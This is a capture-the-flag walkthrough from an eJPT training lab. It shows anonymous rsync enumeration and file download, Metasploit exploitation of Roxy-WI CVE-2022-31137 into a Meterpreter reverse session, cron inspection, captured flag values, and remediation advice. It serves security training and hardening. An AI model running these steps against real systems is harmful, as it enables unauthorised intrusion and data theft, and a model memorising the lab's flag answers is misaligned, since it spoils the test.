<div align="center">
  <a href="../README.md">⬅️ <b>Back to Section Hub</b></a> | <a href="../../README.md">📂 <b>eJPT Track Hub</b></a> | <a href="../../../README.md">🏠 <b>Portfolio Root</b></a>
</div>

<br>

<div align="center">
  <h1>🎯 Host & Network Penetration Testing — The Metasploit Framework CTF 2 🎯</h1>
  <p><b>Platform:</b> INE Security | <b>Learning Path:</b> Penetration Testing Student (eJPT v2) | <b>Course:</b> Host & Network Penetration Testing: The Metasploit Framework (MSF) | <b>Difficulty:</b> Easy / Medium</p>
  <p><i>Date Completed: 03 November 2026</i></p>

[![Platform - INE](https://img.shields.io/badge/Platform-INE%20Security-0078D4?style=flat-square&logo=target)](https://ine.com/)
[![Track - eJPT](https://img.shields.io/badge/Track-eJPT%20v2-orange?style=flat-square&logo=hackthebox)](../../README.md)
[![Flags - 4/4](https://img.shields.io/badge/Flags%20Captured-4%20%2F%204-success?style=flat-square&logo=checkmarx)](./README.md)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-T1595.002%20%7C%20T1190%20%7C%20T1059.004%20%7C%20T1053.003-red?style=flat-square)](https://attack.mitre.org/)
[![CVSS v3.1](https://img.shields.io/badge/Max%20Severity-9.8%20(Critical)-critical?style=flat-square)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)
</div>

---

## 📋 Objective & Scope
> **Execute hands-on host and network penetration testing against two Linux target machines (`target1.ine.local` and `target2.ine.local`). The assessment requires enumerating non-standard network services, exploiting misconfigured and unauthenticated RSYNC backup daemons for sensitive data extraction, weaponizing the Metasploit Framework to achieve remote command execution against Roxy-WI (CVE-2022-31137), establishing interactive Meterpreter sessions, and analyzing local automated cron tasks to capture all 4 challenge flags.**

- **Target 1 (`target1.ine.local` / `192.211.160.3`):** Linux host exposing an unauthenticated RSYNC service on port 873/tcp hosting unauthorized backup shares.
- **Target 2 (`target2.ine.local` / `192.211.160.4`):** Linux host (Ubuntu) running Apache 2.4.52 hosting a vulnerable Roxy-WI web application on ports 80/tcp and 443/tcp, with misconfigured local scheduled cron jobs.
- **Attacker Host (`root@INE`):** Kali Linux (`192.211.160.2`).
- **Primary Tooling:** Nmap, RSYNC client, Metasploit Framework (`msfconsole`), Meterpreter, Linux CLI utilities.

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20081519.png" alt="INE The Metasploit Framework CTF 2 challenge dashboard showing target details and flag tasks" width="850px">
  <br><i>Figure 1: INE Lab Dashboard — Challenge briefing, scope requirements, and flag capture objectives.</i>
</div>

<br>

---

## 🛠️ Tools Used
| Tool | Purpose in Assessment |
| :--- | :--- |
| **Nmap** | Comprehensive TCP port reconnaissance, service version detection (`-sV`), and NSE script scanning (`-sC`). |
| **rsync** | Querying remote RSYNC daemon modules, inspecting module banners, and synchronizing sensitive backup files locally. |
| **Metasploit Framework (`msfconsole`)** | Searching, configuring, and executing the weaponized exploit module targeting Roxy-WI. |
| **`exploit/linux/http/roxy_wi_exec`** | Weaponized Metasploit exploit module executing unauthenticated remote command injection against Roxy-WI (< 6.1.1.0). |
| **Meterpreter** | Advanced in-memory command payload providing channel management, filesystem exploration, and spawning interactive shell sessions. |
| **Linux Shell Utilities** | File manipulation (`cat`, `ls`), system navigation, and cron schedule auditing (`/etc/cron.d`). |

<br>

---

## 🗺️ MITRE ATT&CK® Enterprise Mapping
| Tactic | Technique ID | Technique Name | Description in Assessment |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Full-port TCP sweep and NSE script scanning targeting RSYNC and Apache Roxy-WI services. |
| **Initial Access / Discovery** | `T1039` | Data from Network Shared Drive | Accessing unauthenticated RSYNC daemon shares and exfiltrating confidential backup archives (`pii_data.xlsx`). |
| **Discovery** | `T1018` | Remote System Discovery | Querying the RSYNC daemon for available modules, permissions, and service banners. |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploiting Roxy-WI unauthenticated command injection (`CVE-2022-31137`) via Metasploit for remote shell access. |
| **Execution** | `T1059.004` | Command & Scripting Interpreter: Unix Shell | Spawning an interactive `/bin/bash` PTY shell under the `www-data` service account. |
| **Discovery** | `T1083` | File and Directory Discovery | Enumerating root `/` and administrative configuration directories for flag artifacts. |
| **Persistence / Execution** | `T1053.003` | Scheduled Task/Job: Cron | Inspecting system cron directory (`/etc/cron.d/www-data-cron`) to uncover automated background execution strings. |

<br>

---

## 🔬 Technical Exploitation Walkthrough

---

### 1. Target 1: RSYNC Enumeration & Data Exfiltration (`target1.ine.local`)

#### Network Scanning & Port Discovery
We begin our engagement by performing a full TCP port scan against `target1.ine.local` (`192.211.160.3`) using Nmap with service fingerprinting (`-sV`) and default scripts (`-sC`):

```bash
nmap -sV -sC -p- target1.ine.local
```

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20081754.png" alt="Nmap full port scan against target1.ine.local showing port 873 RSYNC" width="850px">
  <br><i>Figure 2: Nmap full port scan against target1.ine.local revealing open RSYNC service on port 873/tcp.</i>
</div>

The scan confirms that **TCP Port 873** is open, running the `rsync` protocol (protocol version 31). No other services are exposed on the host.

---

#### Flag 1: RSYNC Daemon Banner & Module Enumeration
RSYNC daemons can be configured with or without authentication. To inspect the server's available modules and banner information, we query the service directly using the `rsync` client:

```bash
rsync rsync://target1.ine.local
```

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20082104.png" alt="Querying RSYNC daemon on target1.ine.local revealing Flag 1" width="850px">
  <br><i>Figure 3: Anonymous RSYNC banner enumeration disclosing the backupwscohen module and Flag 1.</i>
</div>

The server immediately responds without prompting for credentials, listing an exposed module named `backupwscohen` accompanied by a comment string containing **Flag 1**:

```text
backupwscohen   FLAG1_a8762fae407e4acb95cefa003df81dd5
```

> **Flag 1 Captured:** `FLAG1_a8762fae407e4acb95cefa003df81dd5`

---

#### Flag 2: Exploring the RSYNC Share & Exfiltrating Data
Next, we enumerate the contents of the `backupwscohen` module to determine what files are accessible:

```bash
rsync rsync://target1.ine.local/backupwscohen/
```

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20082331.png" alt="Listing directory contents of the RSYNC backupwscohen share" width="850px">
  <br><i>Figure 4: Directory listing of the unauthenticated backupwscohen share showing backup files.</i>
</div>

The share contains three files:
- `TPSData.txt` (20 bytes)
- `office_staff.vhd` (25 bytes)
- `pii_data.xlsx` (39 bytes)

We synchronize all files from the remote share to our local working directory using `rsync -av`:

```bash
rsync -av rsync://target1.ine.local/backupwscohen/ .
```

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20082406.png" alt="Downloading files from RSYNC share and reading pii_data.xlsx for Flag 2" width="850px">
  <br><i>Figure 5: Exfiltrating backup files and reading pii_data.xlsx to capture Flag 2.</i>
</div>

After downloading the files, we inspect their contents:
```bash
cat office_staff.vhd
cat pii_data.xlsx
```

`office_staff.vhd` contains `Sample office staff data`. Inspecting `pii_data.xlsx` reveals **Flag 2**:

```text
FLAG2_dbe158bba6854efe909196d8ffc08746
```

> **Flag 2 Captured:** `FLAG2_dbe158bba6854efe909196d8ffc08746`

---

### 2. Target 2: Roxy-WI Exploitation & Cron Forensics (`target2.ine.local`)

#### Network Scanning & Service Fingerprinting
We now pivot our assessment to `target2.ine.local` (`192.211.160.4`). We perform service and script scanning with Nmap:

```bash
nmap -sV -sC target2.ine.local
```

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20082614.png" alt="Nmap service scan of target2.ine.local revealing Roxy-WI on ports 80 and 443" width="850px">
  <br><i>Figure 6: Nmap service scan of target2.ine.local revealing Apache 2.4.52 hosting Roxy-WI on ports 80/tcp and 443/tcp.</i>
</div>

The scan output reveals:
- **Port 80/tcp:** Apache httpd 2.4.52 (Ubuntu), HTTP title `Roxy-WI`
- **Port 443/tcp:** Apache httpd 2.4.52 (Ubuntu) SSL/TLS, certificate common name `*.roxy-wi.org`, HTTP title `Roxy-WI`, hostname `roxy-wi.example.com`

**Roxy-WI** is an open-source web interface for managing HAProxy, Nginx, Apache, and Keepalived.

---

#### Vulnerability Analysis: Roxy-WI Command Injection (CVE-2022-31137)
We launch Metasploit Framework and search for existing exploit modules targeting Roxy-WI:

```bash
msfconsole -q
msf6 > search Roxy-WI
```

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20082939.png" alt="Searching Metasploit for Roxy-WI modules" width="850px">
  <br><i>Figure 7: Searching Metasploit for Roxy-WI modules, identifying exploit/linux/http/roxy_wi_exec.</i>
</div>

Metasploit locates a high-reliability exploit module:
- **`exploit/linux/http/roxy_wi_exec`** — *Roxy-WI Prior to 6.1.1.0 Unauthenticated Command Injection RCE* (Rank: `excellent`, Disclosure Date: `2022-07-06`).
- **Root Cause:** Roxy-WI versions prior to 6.1.1.0 contain a critical vulnerability in the `options.py` endpoint where user-supplied parameters passed via `ip` or `serv` are concatenated directly into backend system calls without proper sanitization, enabling unauthenticated remote command injection.

We select the module and inspect its configurable parameters:

```bash
msf6 > use 0
msf6 exploit(linux/http/roxy_wi_exec) > options
```

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20083050.png" alt="Inspecting options for roxy_wi_exec module" width="850px">
  <br><i>Figure 8: Reviewing configuration options for the roxy_wi_exec exploit module.</i>
</div>

---

#### Metasploit Weaponization & Meterpreter Foothold
We configure the module settings to target `target2.ine.local` over HTTPS (Port 443) and set our local listening address:

```bash
msf6 exploit(linux/http/roxy_wi_exec) > set LHOST 192.211.160.2
msf6 exploit(linux/http/roxy_wi_exec) > set RHOSTS target2.ine.local
msf6 exploit(linux/http/roxy_wi_exec) > exploit
```

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20083340.png" alt="Executing the Roxy-WI exploit and opening Meterpreter session 1" width="850px">
  <br><i>Figure 9: Weaponizing CVE-2022-31137 against target2.ine.local, successfully opening Meterpreter session 1.</i>
</div>

The exploit module verifies that `192.211.160.4:443` is vulnerable, sends the command injection payload, and establishes an active **Meterpreter session** (`192.211.160.2:4444 -> 192.211.160.4:44740`).

---

#### Spawning Interactive Shell & Flag 3 Capture
From the Meterpreter session, we spawn a standard command shell and upgrade to an interactive `/bin/bash` instance:

```bash
meterpreter > shell
/bin/bash -i
```

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20083444.png" alt="Dropping into an interactive bash shell as user www-data" width="850px">
  <br><i>Figure 10: Upgrading to an interactive bash shell as the www-data service account.</i>
</div>

We find ourselves operating within `/var/www/haproxy-wi/app` under the `www-data` service account. We immediately navigate to the root directory `/` and list the filesystem contents:

```bash
cd /
ls
```

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20083629.png" alt="Listing root directory on target2.ine.local revealing flag.txt" width="850px">
  <br><i>Figure 11: Filesystem discovery in root / revealing the flag.txt artifact.</i>
</div>

We read the contents of `/flag.txt`:

```bash
cat flag.txt
```

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20083728.png" alt="Reading /flag.txt to capture Flag 3" width="850px">
  <br><i>Figure 12: Exfiltrating Flag 3 from /flag.txt.</i>
</div>

```text
FLAG3_2ccfd032f5c54caa92983bfeec4163ca
```

> **Flag 3 Captured:** `FLAG3_2ccfd032f5c54caa92983bfeec4163ca`

---

#### Flag 4: System Automation & Scheduled Cron Job Forensics
The challenge briefing instructs us to inspect automated tasks and scheduled jobs. In Linux systems, recurring jobs are typically orchestrated via `cron` and defined within `/etc/cron*` directories.

We navigate to `/etc` and check the available configuration directories:

```bash
cd /etc
ls
```

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20084044.png" alt="Enumerating /etc directories on target2.ine.local" width="850px">
  <br><i>Figure 13: Enumerating /etc configuration directories, identifying cron.d and cron.daily.</i>
</div>

We navigate into `/etc/cron.d` and list its contents:

```bash
cd /etc/cron.d
ls
```

The directory contains:
- `e2scrub_all`
- `www-data-cron`

We view the contents of the custom scheduled task file `www-data-cron`:

```bash
cat www-data-cron
```

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20084321.png" alt="Reading /etc/cron.d/www-data-cron to capture Flag 4" width="850px">
  <br><i>Figure 14: Inspecting www-data-cron to uncover the scheduled command containing Flag 4.</i>
</div>

The file contains an active cron entry executing every minute under the `www-data` account:

```text
* * * * * www-data echo "FLAG4_020f687cc2c34f1b8dd80064427d982a"
```

```text
FLAG4_020f687cc2c34f1b8dd80064427d982a
```

> **Flag 4 Captured:** `FLAG4_020f687cc2c34f1b8dd80064427d982a`

---

## 🏁 3. Flags Summary

| Flag | Target | Prompt / Task | Flag Value | Technical Exploitation Vector |
| :---: | :--- | :--- | :--- | :--- |
| **Flag 1** | `target1.ine.local` (`192.211.160.3`) | Enumerate open port & inspect RSYNC banner | `FLAG1_a8762fae407e4acb95cefa003df81dd5` | Unauthenticated RSYNC daemon banner discovery via `rsync rsync://target1.ine.local` |
| **Flag 2** | `target1.ine.local` (`192.211.160.3`) | Explore files on the RSYNC server | `FLAG2_dbe158bba6854efe909196d8ffc08746` | Unauthenticated synchronization (`rsync -av`) & reading `pii_data.xlsx` |
| **Flag 3** | `target2.ine.local` (`192.211.160.4`) | Exploit webapp via Metasploit on target2 | `FLAG3_2ccfd032f5c54caa92983bfeec4163ca` | Metasploit `exploit/linux/http/roxy_wi_exec` (CVE-2022-31137) & reading `/flag.txt` |
| **Flag 4** | `target2.ine.local` (`192.211.160.4`) | Investigate scheduled jobs or running processes | `FLAG4_020f687cc2c34f1b8dd80064427d982a` | Scheduled cron job auditing (`cat /etc/cron.d/www-data-cron`) |

---

## 🛡️ 4. Vulnerability Risk Ratings & Defensive Hardening

### 📊 CVSS v3.1 Findings Matrix

| Finding | Severity | CVSS v3.1 Score | Vector String |
| :--- | :---: | :---: | :--- |
| **Roxy-WI Unauthenticated Remote Command Execution (CVE-2022-31137)** | 🔴 Critical | **9.8** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Unauthenticated / Insecure RSYNC Daemon File Exposure** | 🔴 High | **7.5** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Cleartext Sensitive Strings Stored in World-Readable Cron Jobs** | 🟡 Medium | **5.5** | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |

<br>

<details>
<summary><b>🔧 Click to expand enterprise remediation strategies &amp; hardening guidelines</b></summary>
<br>

### 1. Remediation for Roxy-WI Remote Command Injection (CVE-2022-31137)
- **Root Cause:** Roxy-WI versions prior to 6.1.1.0 did not properly validate or sanitize user input before passing parameters into internal shell execution functions inside `options.py`, allowing attackers to append arbitrary shell commands.
- **Remediation Steps:**
  1. **Immediate Version Upgrade:** Upgrade Roxy-WI to version **6.1.1.0** or later where parameter parsing is parameterized and sanitized.
  2. **Restrict Access to Admin Interface:** Roxy-WI should never be exposed directly to the public Internet or untrusted network segments. Bind the service to a dedicated management network/VLAN or require a bastion VPN host with MFA.
  3. **Web Application Firewall (WAF):** Implement WAF inspection rules to detect and block shell metacharacters (`;`, `|`, `&`, `` ` ``, `$()`) within HTTP GET and POST request bodies directed at management endpoints.

### 2. Hardening Insecure RSYNC Daemon Configurations
- **Root Cause:** The RSYNC daemon was running without authentication (`auth users` directive omitted) and without IP whitelisting (`hosts allow` omitted), allowing any network participant to enumerate modules and pull proprietary backups.
- **Remediation Steps:**
  1. **Enforce Authentication:** Configure `/etc/rsyncd.conf` with explicit user credentials:
     ```ini
     [backupwscohen]
     path = /var/backups/wscohen
     comment = Backup Repository
     read only = yes
     auth users = backup_agent
     secrets file = /etc/rsyncd.secrets
     ```
  2. **Restrict IP Access:** Enforce network-level restrictions in `/etc/rsyncd.conf`:
     ```ini
     hosts allow = 192.168.10.50, 10.0.0.0/24
     hosts deny = *
     ```
  3. **Tunnel Over SSH:** Deprecate standalone unencrypted RSYNC daemon instances (port 873/tcp) and mandate RSYNC over SSH (`rsync -e ssh`) using dedicated, restricted SSH key pairs.

### 3. Hardening Scheduled Tasks & System Cron
- **Root Cause:** Sensitive configuration strings, parameters, and tokens were stored in cleartext inside `/etc/cron.d/www-data-cron`, accessible to unprivileged local accounts.
- **Remediation Steps:**
  1. **Restrict File Permissions:** Apply strict file ownership and permission masks to all cron configuration files:
     ```bash
     chmod 600 /etc/cron.d/*
     chown root:root /etc/cron.d/*
     ```
  2. **Eliminate Hardcoded Secrets:** Never place API keys, passwords, or secret tokens directly in command-line arguments within crontabs. Use secure secret management stores or restricted environment files with `0400` permissions.

</details>

<br>

---

## 💡 5. Key Learnings & Takeaways
- **Non-Standard Services Warrant Immediate Attention:** Network services like RSYNC running on port 873/tcp are frequently overlooked by perimeter teams. Misconfigured daemons allow zero-effort bulk exfiltration without triggering authentication alerts.
- **Web Administration Consoles are High-Risk Assets:** Applications designed to manage infrastructure (HAProxy, Nginx, Keepalived) operate with significant underlying permissions. A single command injection flaw in such tools yields instant infrastructure control.
- **Metasploit Module Reliability:** Leveraging verified Metasploit modules (`exploit/linux/http/roxy_wi_exec`) enables swift and reliable proof-of-concept verification, reducing manual exploit turnaround time during time-constrained assessments.
- **System Automation Leaves Persistent Artifacts:** Scheduled maintenance jobs and cron configurations frequently harbor sensitive credentials, debugging commands, and operational secrets that provide high-value intelligence to post-exploitation audits.

---

<div align="center">
  <a href="../README.md">⬅️ <b>Back to Section Hub</b></a> | <a href="../../README.md">📂 <b>eJPT Track Hub</b></a> | <a href="../../../README.md">🏠 <b>Portfolio Root</b></a>
  <br><br>
  <i>Walkthrough documented on 03 November 2026. Part of the INE eJPT Certification Journey.</i>
</div>

